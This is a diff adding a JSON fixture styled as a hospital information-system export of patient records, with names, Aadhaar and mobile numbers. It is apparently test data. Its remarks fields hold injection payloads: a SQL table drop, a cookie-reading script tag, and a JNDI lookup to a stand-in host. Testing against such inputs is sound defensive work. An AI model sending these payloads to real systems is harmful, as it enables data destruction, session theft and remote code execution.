@@ -1,0 +1,26 @@
+{
+  "source": "KVH HIS 2019 export",
+  "rows": [
+    {
+      "reg_year": 2019,
+      "remarks": "'; DROP TABLE patients;--",
+      "name": "Lalitha Lepcha",
+      "aadhaar": "8099 8956 2776",
+      "mobile": "9524218571"
+    },
+    {
+      "reg_year": 2019,
+      "remarks": "<script>alert(document.cookie)</script>",
+      "name": "Tejinder D'Souza",
+      "mobile": 7889281350.0,
+      "reg_no": "kvh/op/25-365180"
+    },
+    {
+      "reg_year": 2019,
+      "remarks": "${jndi:ldap://evil.invalid/a}",
+      "name": "Paramjit Gowda",
+      "mobile": 9207073198.0,
+      "reg_no": "kvh/op/25-585001"
+    }
+  ]
+}
